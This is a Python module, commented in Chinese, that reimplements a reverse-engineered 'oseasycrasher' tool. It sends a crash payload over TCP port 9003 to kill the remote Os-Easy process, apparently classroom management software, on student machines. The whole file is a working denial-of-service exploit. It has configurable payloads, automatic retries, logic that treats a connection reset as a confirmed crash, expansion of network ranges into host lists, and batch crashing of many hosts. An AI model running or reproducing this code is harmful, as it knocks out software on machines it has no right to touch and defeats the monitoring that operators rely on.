# src/modules/remote_crasher.py
# 远程崩溃模块 —— 按 IP 发送崩溃载荷触发远端 Os-Easy 进程终止
#
# 对应原版释放物 oseasycrasher.exe：
#   - 用法：oseasycrasher.exe <ip>
#   - 实现：WSAStartup -> 创建 TCP socket -> connect(<ip>) -> 发送 payload
#   - 反汇编证据：Kill target: %s / [*]Sending Test Payload... / Connection code %d
#
# 本模块用纯 Python/socket 复刻同一套"按 IP 发送载荷触发远端崩溃"流程，
# 并把"载荷内容""目标端口"开放为可配置参数。

import ipaddress
import socket
import time

from src.utils.logger import info, warn, error, debug

# 目标端口（学生端监听的控制通道，实测 ConnectPort=9003 可触发崩溃）
DEFAULT_PORT = 9003
DEFAULT_TIMEOUT = 3.0    # 连接/收发超时
# 发送到目标机的崩溃/控制指令载荷（原版通过自定义协议；此处开放给配置）
DEFAULT_PAYLOAD = b"oshack\r\n"


def parse_payload(text: str) -> bytes:
    """把用户输入的载荷文本转成原始字节。

    支持解释转义序列：\\r \\n \\t \\\\ \\xNN 等；
    文本为空时返回默认载荷。

    Args:
        text: 界面输入的载荷字符串。

    Returns:
        对应的原始字节载荷。
    """
    text = (text or "").strip()
    if not text:
        return DEFAULT_PAYLOAD
    try:
        # 先按 utf-8 解码成字符，再解释 \r \n \x 等转义，最后转回 latin1 字节
        return text.encode("utf-8").decode("unicode_escape").encode("latin1")
    except Exception:
        return text.encode("utf-8")


def expand_cidr(cidr: str):
    """展开网段字符串为 IP 列表；非合法网段则原样返回。"""
    try:
        net = ipaddress.ip_network(cidr.strip(), strict=False)
        hosts = [str(h) for h in net.hosts()]
        debug(f"网段 {cidr.strip()} 展开为 {len(hosts)} 台主机")
        return hosts
    except ValueError:
        warn(f"网段格式无效，按单 IP 处理: {cidr.strip()}")
        return [cidr.strip()]


# 结果状态标记（供 GUI 判定弹窗类型）
RESULT_OK = "[OK]"        # 崩溃已触发 / 载荷已送达
RESULT_FAIL = "[FAIL]"    # 明确失败（拒连/超时/无法解析等）


def crash(ip: str, port: int = DEFAULT_PORT, payload: bytes = DEFAULT_PAYLOAD,
          timeout: float = DEFAULT_TIMEOUT, retries: int = 2,
          retry_delay: float = 3.0) -> str:
    """按 IP 对远程主机发送崩溃载荷（智能判定 + 自动重试）。

    判定规则（依据 docs/CRASH_FUNCTION_REVERSE_REPORT.md 逆向结论）：
      - ConnectionRefusedError(10061) → 9003 未监听（服务未拉起/空窗期）
        → 自动等待 retry_delay 秒重试，覆盖“第一次拒连、第二次成功”的拉起窗口
      - ConnectionResetError(10054)  → 连接建立后被强制关闭
        → 即服务端解析线程崩溃、socket 被 RST → ★ 崩溃已触发（成功）
      - socket.timeout               → 载荷已送达，等待响应超时（可能已生效）
      - 发送成功无异常               → 载荷已送达，等待观察

    Args:
        ip:          目标主机 IP。
        port:        目标端口。
        payload:     要发送的原始字节载荷。
        timeout:     连接/收发超时。
        retries:     10061 未监听时的重试次数（默认 2，即最多尝试 3 次）。
        retry_delay: 重试间隔秒数，覆盖 9003 服务拉起窗口（默认 3s）。

    Returns:
        结果描述字符串。
    """
    ip = (ip or "").strip()
    if not ip:
        warn("远程崩溃：未提供目标 IP，已跳过")
        return f"{RESULT_FAIL} 未提供目标 IP"
    try:
        port = int(port or DEFAULT_PORT)
    except (TypeError, ValueError):
        error(f"远程崩溃：端口无效: {port}")
        return f"{RESULT_FAIL} 端口无效: {port}"

    attempts = 1 + max(0, int(retries))
    for attempt in range(1, attempts + 1):
        debug(f"远程崩溃 尝试[{attempt}/{attempts}] → 目标 {ip}:{port}，"
              f"载荷 {len(payload)} 字节 [{payload!r}]，超时 {timeout}s")
        t0 = time.perf_counter()
        try:
            sock = socket.create_connection((ip, port), timeout=timeout)
            conn_ms = (time.perf_counter() - t0) * 1000
            debug(f"TCP 连接建立成功 {ip}:{port}（耗时 {conn_ms:.0f}ms）")
        except ConnectionRefusedError:
            el = (time.perf_counter() - t0) * 1000
            if attempt < attempts:
                warn(f"尝试[{attempt}/{attempts}] {ip}:{port} 未监听(10061，耗时 {el:.0f}ms)，"
                     f"{retry_delay}s 后重试（9003 服务可能正在拉起）")
                time.sleep(retry_delay)
                continue
            warn(f"{ip}:{port} 重试 {retries} 次后 9003 仍拒连，服务未拉起")
            return f"{RESULT_FAIL} 连接 {ip}:{port} 被拒(10061) ×{attempts}，9003 未监听（服务未拉起），已放弃"
        except socket.timeout:
            el = (time.perf_counter() - t0) * 1000
            warn(f"连接 {ip}:{port} 超时（{timeout}s）（耗时 {el:.0f}ms）")
            return f"{RESULT_FAIL} 连接 {ip}:{port} 超时，发送失败"
        except socket.gaierror as exc:
            error(f"无法解析主机 {ip}: {exc}")
            return f"{RESULT_FAIL} 无法解析主机 {ip}"
        except OSError as exc:
            el = (time.perf_counter() - t0) * 1000
            warn(f"连接 {ip}:{port} 失败: {exc}（耗时 {el:.0f}ms）")
            return f"{RESULT_FAIL} 连接 {ip}:{port} 失败: {exc}"

        # 连接成功：发送载荷并判定结果
        try:
            sock.sendall(payload)
            debug(f"已发送载荷 {len(payload)} 字节到 {ip}:{port}")
            try:
                resp = sock.recv(64)
                if resp:
                    extra = f"，收到响应 {len(resp)} 字节: {resp!r}"
                    msg = f"{RESULT_OK} 崩溃指令已发送到 {ip}:{port}{extra}"
                else:
                    extra = "，连接被对方正常关闭(EOF)"
                    msg = f"{RESULT_OK} 崩溃指令已发送到 {ip}:{port}{extra}"
                info(msg)
                return msg
            except ConnectionResetError:
                # 10054：连接建立后被强制关闭 = 服务端解析线程崩溃 → 成功
                msg = f"{RESULT_OK} {ip}:{port} ✅ 载荷已送达，对方连接被强制关闭（崩溃已触发）"
                info(msg)
                return msg
            except socket.timeout:
                msg = f"{RESULT_OK} {ip}:{port} 载荷已送达，等待响应超时（可能已生效，观察 10s）"
                info(msg)
                return msg
        finally:
            sock.close()
            debug(f"已关闭与 {ip}:{port} 的连接")

    return f"连接 {ip}:{port} 失败"  # 理论不可达


def crash_targets(ips, port: int = DEFAULT_PORT,
                  payload: bytes = DEFAULT_PAYLOAD) -> str:
    """对多个 IP 批量发送崩溃载荷。

    Args:
        ips:  IP 列表。

    Returns:
        带状态标记的结果摘要字符串（供 GUI 判定弹窗类型）。
    """
    ips = list(ips)
    debug(f"远程崩溃 批量开始 → 共 {len(ips)} 台，端口 {port}")
    t0 = time.perf_counter()
    ok, fail = 0, 0
    details = []
    for i, ip in enumerate(ips, 1):
        debug(f"--- 批量进度 [{i}/{len(ips)}] {ip} ---")
        r = crash(ip, port, payload)
        # 成功标志：带 [OK] 前缀
        if r.startswith(RESULT_OK):
            ok += 1
        else:
            fail += 1
        details.append(f"{ip}: {r}")
    el = time.perf_counter() - t0
    info(f"远程崩溃批量完成：成功 {ok} 台，失败 {fail} 台，总耗时 {el:.2f}s")
    # 只把失败项写日志，避免刷屏
    for d in details:
        if RESULT_FAIL in d or "超时" in d:
            warn(d)
    if ok > 0 and fail == 0:
        return f"{RESULT_OK} 批量远程崩溃：成功 {ok} 台，失败 0 台（总耗时 {el:.1f}s）"
    if ok == 0 and fail > 0:
        return f"{RESULT_FAIL} 批量远程崩溃：成功 0 台，失败 {fail} 台（总耗时 {el:.1f}s）"
    return f"{RESULT_FAIL} 批量远程崩溃：成功 {ok} 台，失败 {fail} 台（总耗时 {el:.1f}s，部分失败）"
